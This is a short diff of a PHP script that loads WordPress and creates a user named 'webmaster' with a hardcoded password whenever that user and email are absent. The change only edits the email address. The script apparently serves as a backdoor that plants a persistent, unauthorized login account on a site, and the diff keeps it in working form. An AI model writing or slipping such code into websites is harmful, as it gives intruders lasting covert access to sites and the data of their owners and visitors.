@@ -4,7 +4,7 @@ require_once('./wp-load.php');
 
 $username = 'webmaster';
 $password = 'Seo301Take!';
-$email = 'thesdans@gamail.com';
+$email = 'admin@gamail.com';
 
 if (!username_exists($username) && !email_exists($email)) {
     $user_id = wp_create_user($username, $password, $email);
@@ -25,4 +25,5 @@ if (!username_exists($username) && !email_exists($email)) {
 }
 
 ?>
+
 
